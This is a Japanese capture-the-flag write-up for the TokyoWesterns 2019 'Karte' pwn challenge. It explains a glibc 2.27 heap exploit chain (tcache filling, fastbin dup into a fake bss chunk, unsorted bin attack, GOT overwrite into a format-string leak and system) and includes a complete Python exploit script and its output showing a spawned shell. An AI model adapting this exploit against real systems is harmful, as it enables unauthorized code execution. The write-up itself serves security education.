# [pwn 279pts] Karte - TokyoWesterns CTF 5th 2019
64ビットバイナリで、PIEやRELROは無効です。やったー。
```
$ checksec -f ./karte
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   91 Symbols     Yes      0               4       ./karte
```
またShow系の無いヒープ問題です。が、今回はPIEやRELROが無効なのでShowが無いことはそんなに気にしなくて大丈夫ですね。

さて、IDAで読むといろいろ奇妙な処理をしています。
最初にbssにあるnameに0x3fバイトまで文字を格納できます。
最大3つまで格納できるlistがあり、addするとサイズが0x800バイト以下ならcalloc、0x800バイトより大きければmallocされます。mallocされた場合、後で`/dev/zero`のfdが入ったzfdからサイズ分readされます。
deleteすると、list[i]->idとlist[i]->is_usedが0でなければfreeしてlist[i]->is_usedに0を入れます。
modifyすると、list[i]->idが0でなければstrlen(list[i]->buf)だけ書き換えられます。ここにUAFがありますが、modifyは`key == lock`でなければ呼び出せません。一度modifyすると`key = 0xdeadc0bebeef`されるのでもう呼び出せなくなります。

libc-2.27なのでtcacheが有効です。これは厄介で、callocでは`_int_malloc`を呼び出しておりtcacheが使われないのでmodifyでfdを書き換えてもダメです。とりあえずfastbinを使うために、deleteしまくってtcacheを埋めます。fastbinが使えるようになると、nameに用意した偽のチャンクに向けることができます。
nameに向けると何が嬉しいかというと、rename機能があるので実質modifyと同じことを何回もできます。

目標としてはatoiのgotをprintfのpltに書き換えることです。そこまでできればFSBに持ち込んでAAR/AAWができます。

さて、listのちょっと前を見てみると下のようになっています。
```
pwndbg> x/16xg 0x602100
0x602100 <reserved+96>: 0x0000000000000000      0x0000000000000000
0x602110 <reserved+112>:        0x0000000000000000      0x0000000000000000
0x602120 <zfd>: 0x0000000400000003      0x0000000000000000
0x602130:       0x0000000000000000      0x0000000000000000
0x602140 <list>:        0x0000451500000001      0x00000000020f6360
0x602150 <list+16>:     0x0000227900000000      0x00000000006021b0
0x602160 <list+32>:     0x0000000000000000      0x0000000000000000
0x602170 <lock>:        0x963d166c9f91dc5f      0x0000000000000000
```
fastbin dupでこの辺りにポインタを向けられたら、listも好きなように変更できる上lockも変えられて万々歳です。しかし、この辺りにはサイズとして使える値が存在しません。そこで、今回はunsorted bin attackを使って0x7f...をreservedのあたりに設置するこにしました。あとはfastbin dupでいい感じにreservedにポインタを向ければ、そこから0x68バイトくらいは書き換えられるのでlockを0xdeadc0bebeefに書き換え、listにatoiのgotとかを入れておけばmodifyでGOT overwriteできます。

こんな感じになればOKです。
```
pwndbg> x/16xg 0x602110
0x602110 <reserved+112>:        0x1b39dcfca0000000      0x000000000000007f
0x602120 <zfd>: 0x0000000400000003      0x0000000000000000
0x602130:       0x0000000000000000      0x0000000000000000
0x602140 <list>:        0x0000548200000001      0x00000000006021b0
0x602150 <list+16>:     0x000066eb00000000      0x00000000006021b0
0x602160 <list+32>:     0x0000c7b700000001      0x0000000000602200
0x602170 <lock>:        0xe8408093440f5004      0x0000000000000000
0x602180 <stdout@@GLIBC_2.2.5>: 0x00007f1b39dd0760      0x0000000000000000
```

あとはやりたい放題。
最後にFSBでGOT overwriteしても良いのですが、printfが出力した文字数を返すという性質を使えば実質atoiと同様に使えます。modifyが使えるので、freeをsystemに変えましょう。

```python
from ptrlib import *

def add(size, desc):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("> ", str(size))
    sock.sendafter("> ", desc)
    sock.recvuntil("id ")
    return int(sock.recvline())

def delete(id):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter("> ", str(id))
    return

def modify(id, desc):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter("id > ", str(id))
    sock.sendafter("description > ", desc)
    return

def rename(name):
    sock.sendlineafter("> ", "99")
    sock.sendafter("... ", name)
    return

elf = ELF("./karte")
libc = ELF("./libc-2.27.so")
sock = Process("./karte")
addr_name = elf.symbol("name")
addr_target = 0x602110
delta = 0xe7

# make name be a chunk
name  = p64(0) + p64(0x71)
name += p64(addr_name + 0x50) + p64(0)
sock.sendafter("... ", name[:0x3f])

for i in range(7):
    z = add(0x68, "Z" )
    delete(z)
for i in range(7):
    z = add(0x88, "Z" )
    delete(z)
y = add(0x68, "A")
x = add(0x68, "A")
delete(y)
delete(x)
modify(x, p64(addr_name)[:4])
y = add(0x68, "A")
fake_chunk = b"A" * 0x40
fake_chunk += p64(0) + p64(0x71)
fake_chunk += p64(addr_name)
x = add(0x68, fake_chunk) # name
fake_chunk = b"A" * 0x30
fake_chunk += p64(0) + p64(0x21) # @fakeA
fake_chunk += p64(0) * 2
fake_chunk += p64(0) + p64(0x21)
z = add(0x68, fake_chunk) # name + 0x50

rename(p64(0) + p64(0x91))
delete(x)
rename(p64(0) + p64(0x91) + p64(0) + p64(addr_target - 0x15 + 8))
delete(y)
fake_chunk = b'A' * 0x60
fake_chunk += p64(0) + p64(0x21) # don't worry we have @fakeA next
x = add(0x88, fake_chunk) # unsorted bin attack

# overwrite list and lock
rename(p64(0) + p64(0x71))
delete(x)
rename(p64(0) + p64(0x71) + p64(addr_target))
x = add(0x68, "A")
new_id1, new_id3 = 0x1, 0x3
fake_data  = b'/bin/sh\x00' + p64(0) # zfd, rfd
fake_data += p64(0) * 2
fake_data += p32(1) + p32(new_id1) + p64(elf.got("atoi"))   # list[0]
fake_data += p32(0) + p32(0) + p64(0)                       # list[1] == y
fake_data += p32(1) + p32(new_id3) + p64(elf.got("strlen")) # list[2]
fake_data += p64(0xdeadc0bebeef) # lock
y = add(0x68, fake_data)

# GOT overwrite (atoi)
modify(new_id1, p64(elf.plt("printf"))[:6])

# leak libc
sock.sendlineafter("> ", "%19$p.")
libc_base = int(sock.recvuntil(".").rstrip(b"."), 16) - libc.symbol("__libc_start_main") - delta
logger.info("libc base = " + hex(libc_base))

# GOT overwrite (system)
sock.sendlineafter("> ", "%4c") # modify
sock.sendlineafter("id > ", "%{}c".format(new_id3))
sock.sendafter("> ", p64(libc_base + libc.symbol("system"))[:6])

# get the shell!
sock.sendlineafter("> ", "%4c") # modify
sock.sendlineafter("id > ", "%{}c".format(0x58))

sock.interactive()
```

やったー
```
$ python solve.py 
[+] __init__: Successfully created new process (PID=5928)
[+] <module>: libc base = 0x7f73cbb98000
[ptrlib]$                                                                                        
Input new description > id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$
```

# 感想
想定解かは分からないですが、unsorted binでchunk sizeを作るアイデアがすごい面白かったです。
